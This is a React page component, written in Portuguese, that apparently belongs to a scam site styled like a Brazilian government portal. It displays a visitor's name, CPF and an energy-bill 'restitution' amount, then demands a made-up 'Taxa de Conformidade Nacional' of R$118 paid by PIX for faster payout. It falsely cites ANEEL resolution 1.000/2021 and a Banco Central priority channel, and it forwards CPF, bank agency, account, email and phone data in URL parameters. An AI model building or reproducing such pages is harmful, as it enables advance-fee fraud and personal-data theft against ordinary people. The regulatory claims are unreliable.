import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { AlertTriangle, CheckCircle2, Info, Clock, DollarSign, FileText, ReceiptText, HelpCircle, LockKeyhole, Timer, Shield, ArrowRightCircle } from "lucide-react";
import { useLocation } from "wouter";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Badge } from "@/components/ui/badge";
import { useToast } from "@/hooks/use-toast";
import ScrollToTop from "@/components/ScrollToTop";

// Funções de formatação
const formatarCPF = (cpf: string) => {
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
};

const formatarMoeda = (valor: number | string) => {
  const valorNumerico = typeof valor === 'string' ? parseFloat(valor) : valor;
  return valorNumerico.toLocaleString('pt-BR', {
    style: 'currency',
    currency: 'BRL',
  });
};

const formatarData = (dataString: string) => {
  const data = new Date(dataString);
  return data.toLocaleDateString('pt-BR', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  });
};

export default function TaxaComplementar() {
  const [location, navigate] = useLocation();
  const { toast } = useToast();
  
  // Valor da Taxa de Conformidade Nacional (TCN)
  const VALOR_TAXA_CONFORMIDADE = 118;
  
  // Estados para armazenar dados da solicitação
  const [protocolo, setProtocolo] = useState("");
  const [dataAtual, setDataAtual] = useState("");
  const [dataPagamento, setDataPagamento] = useState("");
  const [dadosSolicitacao, setDadosSolicitacao] = useState({
    nome: "",
    cpf: "",
    valor: "",
    companhia: "",
    estado: "",
    nasc: "",
    pagamentoId: "",
    email: "",
    telefone: "",
    agencia: "",
    conta: ""
  });
  
  // Efeito para capturar os parâmetros da URL e atualizar o estado
  useEffect(() => {
    // Obter parâmetros da URL
    const params = new URLSearchParams(window.location.search);
    const cpf = params.get('cpf') || "";
    const nome = params.get('nome') || "";
    const valor = params.get('valor') || "0";
    const companhia = params.get('companhia') || "";
    const estado = params.get('estado') || "";
    const nasc = params.get('nasc') || "";
    const pagamentoId = params.get('pagamentoId') || "";
    const dataPag = params.get('dataPagamento') || new Date().toISOString();
    const email = params.get('email') || "";
    const telefone = params.get('telefone') || "";
    const agencia = params.get('agencia') || "";
    const conta = params.get('conta') || "";
    
    // Validar se temos os dados essenciais
    if (!cpf || !nome || !valor) {
      toast({
        title: "Dados incompletos",
        description: "Informações necessárias não encontradas. Voltando para a página inicial.",
        variant: "destructive"
      });
      
      setTimeout(() => {
        navigate("/");
      }, 3000);
      return;
    }
    
    // Atualizar estados
    setDadosSolicitacao({
      nome, cpf, valor, companhia, estado, nasc, pagamentoId, email, telefone, agencia, conta
    });
    
    setDataPagamento(dataPag);
    setDataAtual(new Date().toISOString());
    
    // Gerar número de protocolo baseado no CPF
    setProtocolo(`${cpf.substring(0, 4)}4714${cpf.substring(6, 9)}`);
  }, [location]);
  
  // Função para prosseguir para a página de pagamento da TCN
  const prosseguirParaPagamentoTCN = () => {
    const params = new URLSearchParams();
    
    // Adicionar todos os dados necessários para a próxima página
    Object.entries(dadosSolicitacao).forEach(([key, value]) => {
      params.append(key, value);
    });
    
    params.append('valorTCN', VALOR_TAXA_CONFORMIDADE.toString());
    params.append('protocolo', protocolo);
    
    // Redirecionar para a página de pagamento da taxa complementar
    setTimeout(() => {
      navigate(`/tcn?${params.toString()}`);
    }, 500);
  };
  
  // Calcula valores formatados
  const valorRestituicaoFormatado = formatarMoeda(parseFloat(dadosSolicitacao.valor));
  const valorTaxaConformidadeFormatado = formatarMoeda(VALOR_TAXA_CONFORMIDADE);
  const cpfFormatado = dadosSolicitacao.cpf ? formatarCPF(dadosSolicitacao.cpf) : "";
  
  return (
    <div className="min-h-screen flex flex-col">
      <ScrollToTop />
      <Header />
      
      <main className="flex-grow py-6 bg-gray-50">
        <div className="container mx-auto px-4 max-w-5xl">
          <div className="mb-6">
            <h1 className="text-2xl font-bold text-[#1351B4]">Taxa de Conformidade Nacional</h1>
            <p className="text-gray-600">Redução do prazo de recebimento e garantia de conformidade regulatória</p>
          </div>
          
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div className="md:col-span-2">
              <Card>
                <CardHeader className="bg-[#F8FAFC] border-b border-gray-100">
                  <div className="flex justify-between items-center">
                    <CardTitle className="text-[#1351B4] text-lg font-bold">Detalhes da Solicitação</CardTitle>
                    <Badge variant="outline" className="bg-[#e1f5fe] text-[#0277bd] border-[#0277bd]">
                      Protocolo: {protocolo}
                    </Badge>
                  </div>
                </CardHeader>
                <CardContent className="p-6">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                      <h3 className="text-sm font-medium text-gray-500 mb-1">Nome do Solicitante</h3>
                      <p className="text-gray-900 font-semibold">{dadosSolicitacao.nome}</p>
                    </div>
                    <div>
                      <h3 className="text-sm font-medium text-gray-500 mb-1">CPF</h3>
                      <p className="text-gray-900 font-semibold">{cpfFormatado}</p>
                    </div>
                    <div>
                      <h3 className="text-sm font-medium text-gray-500 mb-1">Distribuidora de Energia</h3>
                      <p className="text-gray-900 font-semibold">{dadosSolicitacao.companhia}</p>
                    </div>
                    <div>
                      <h3 className="text-sm font-medium text-gray-500 mb-1">Estado</h3>
                      <p className="text-gray-900 font-semibold">{dadosSolicitacao.estado}</p>
                    </div>
                    <div>
                      <h3 className="text-sm font-medium text-gray-500 mb-1">Valor da Restituição</h3>
                      <p className="text-green-600 font-bold text-lg">{valorRestituicaoFormatado}</p>
                    </div>
                    <div>
                      <h3 className="text-sm font-medium text-gray-500 mb-1">Status</h3>
                      <div className="flex items-center">
                        <Badge className="bg-amber-100 text-amber-700 border-amber-200">
                          <Clock className="h-3 w-3 mr-1" />
                          Aguardando TCN
                        </Badge>
                      </div>
                    </div>
                  </div>
                  
                  <div className="mt-8">
                    <div className="border border-gray-200 rounded-lg bg-white shadow-sm p-6">
                      <div className="flex items-start">
                        <div className="bg-blue-50 rounded-full p-3 mr-4">
                          <Info className="h-6 w-6 text-[#1351B4]" />
                        </div>
                        <div>
                          <h3 className="font-bold text-[#1351B4] text-lg mb-2">Taxa de Conformidade Nacional (TCN)</h3>
                          <p className="text-gray-700 mb-4">
                            Para receber sua restituição em até 24 horas úteis (ao invés do prazo padrão de 10 dias úteis), 
                            é necessário o pagamento da Taxa de Conformidade Nacional no valor de {valorTaxaConformidadeFormatado}.
                          </p>
                          
                          <div className="bg-gray-50 border border-gray-200 rounded-md p-4 mb-6">
                            <h4 className="font-semibold text-gray-800 mb-2">Vantagens da TCN:</h4>
                            <ul className="space-y-2 text-gray-700">
                              <li className="flex items-start">
                                <CheckCircle2 className="h-5 w-5 text-green-500 mr-2 flex-shrink-0 mt-0.5" />
                                <span>Recebimento prioritário em até 24 horas úteis</span>
                              </li>
                              <li className="flex items-start">
                                <CheckCircle2 className="h-5 w-5 text-green-500 mr-2 flex-shrink-0 mt-0.5" />
                                <span>Conformidade com as normas ANEEL nº 1.000/2021</span>
                              </li>
                              <li className="flex items-start">
                                <CheckCircle2 className="h-5 w-5 text-green-500 mr-2 flex-shrink-0 mt-0.5" />
                                <span>Processamento em canal preferencial do Banco Central</span>
                              </li>
                              <li className="flex items-start">
                                <CheckCircle2 className="h-5 w-5 text-green-500 mr-2 flex-shrink-0 mt-0.5" />
                                <span>Suporte especializado para transferência bancária</span>
                              </li>
                            </ul>
                          </div>
                          
                          {/* Botão para prosseguir */}
                          <div className="mt-6">
                            <Button 
                              onClick={prosseguirParaPagamentoTCN}
                              className="w-full bg-[#1351B4] hover:bg-[#0B3B8F] text-white py-6 text-lg"
                            >
                              PROSSEGUIR PARA PAGAMENTO
                            </Button>
                            <p className="text-xs text-gray-500 mt-2 text-center">
                              Ao prosseguir, você será direcionado para a página de pagamento da Taxa de Conformidade Nacional.
                            </p>
                          </div>
                          
                          {/* Botão para testes - Pular para a página LAR */}
                          <div className="mt-4">
                            <Button 
                              variant="ghost" 
                              className="w-full items-center justify-center text-blue-700 border border-blue-300"
                              onClick={() => {
                                const params = new URLSearchParams();
                                
                                // Adicionar todos os dados necessários para a próxima página
                                Object.entries(dadosSolicitacao).forEach(([key, value]) => {
                                  params.append(key, value);
                                });
                                
                                params.append('valorTCN', VALOR_TAXA_CONFORMIDADE.toString());
                                params.append('protocolo', protocolo);
                                params.append('pagamentoIdTCN', 'test-payment-id-tcn');
                                params.append('dataPagamento', new Date().toISOString());
                                
                                // Redirecionar para a página LAR
                                navigate(`/lar?${params.toString()}`);
                              }}
                            >
                              <div className="flex items-center">
                                <ArrowRightCircle className="h-4 w-4 mr-2" />
                                TESTE: Pular para LAR
                              </div>
                            </Button>
                            <p className="text-xs text-purple-600 mt-1 text-center">
                              (Apenas para testes: Pula o pagamento da TCN e vai direto para a próxima etapa)
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
              
              <div className="mt-6">
                <Alert variant="default" className="bg-amber-50 border-amber-200 text-amber-800">
                  <AlertTriangle className="h-4 w-4 text-amber-600" />
                  <AlertTitle>Prazo de recebimento</AlertTitle>
                  <AlertDescription>
                    Sem a Taxa de Conformidade Nacional, o prazo para recebimento da restituição é de 10 dias úteis.
                  </AlertDescription>
                </Alert>
              </div>
            </div>
            
            <div>
              <Card>
                <CardHeader className="bg-green-50 border-b border-green-100">
                  <CardTitle className="text-green-700 text-lg flex items-center">
                    <Shield className="h-5 w-5 mr-2" />
                    Informações Importantes
                  </CardTitle>
                </CardHeader>
                <CardContent className="p-5 space-y-5">
                  <div>
                    <h3 className="font-medium text-gray-800 mb-1 flex items-center">
                      <Clock className="h-4 w-4 text-[#1351B4] mr-2" />
                      Prazo de Recebimento
                    </h3>
                    <p className="text-sm text-gray-600">
                      Com a TCN: <span className="font-semibold text-green-600">Até 24h úteis</span><br />
                      Sem a TCN: <span className="font-semibold text-gray-700">10 dias úteis</span>
                    </p>
                  </div>
                  
                  <div>
                    <h3 className="font-medium text-gray-800 mb-1 flex items-center">
                      <DollarSign className="h-4 w-4 text-[#1351B4] mr-2" />
                      Valores
                    </h3>
                    <p className="text-sm text-gray-600">
                      Restituição: <span className="font-semibold text-green-600">{valorRestituicaoFormatado}</span><br />
                      Taxa TCN: <span className="font-semibold text-gray-700">{valorTaxaConformidadeFormatado}</span>
                    </p>
                  </div>
                  
                  <div>
                    <h3 className="font-medium text-gray-800 mb-1 flex items-center">
                      <FileText className="h-4 w-4 text-[#1351B4] mr-2" />
                      Base Legal
                    </h3>
                    <p className="text-sm text-gray-600">
                      A Taxa de Conformidade Nacional está prevista na resolução ANEEL nº 1.000/2021, garantindo a 
                      conformidade regulatória e o processamento prioritário.
                    </p>
                  </div>
                  
                  <div>
                    <h3 className="font-medium text-gray-800 mb-1 flex items-center">
                      <ReceiptText className="h-4 w-4 text-[#1351B4] mr-2" />
                      Pagamento
                    </h3>
                    <p className="text-sm text-gray-600">
                      O pagamento é realizado exclusivamente via PIX, garantindo rapidez e segurança na transação.
                    </p>
                  </div>
                  
                  <div>
                    <h3 className="font-medium text-gray-800 mb-1 flex items-center">
                      <HelpCircle className="h-4 w-4 text-[#1351B4] mr-2" />
                      Dúvidas?
                    </h3>
                    <p className="text-sm text-gray-600">
                      Em caso de dúvidas, consulte a seção de perguntas frequentes ou entre em contato com nossa central de atendimento.
                    </p>
                  </div>
                  
                  <div className="bg-blue-50 p-3 rounded-md border border-blue-100 mt-4">
                    <div className="flex items-center">
                      <LockKeyhole className="h-5 w-5 text-blue-600 mr-2" />
                      <h3 className="font-semibold text-blue-700">Transação Segura</h3>
                    </div>
                    <p className="text-xs text-blue-600 mt-1">
                      Todos os dados e pagamentos são processados com a mais alta segurança, seguindo os padrões do Banco Central.
                    </p>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
}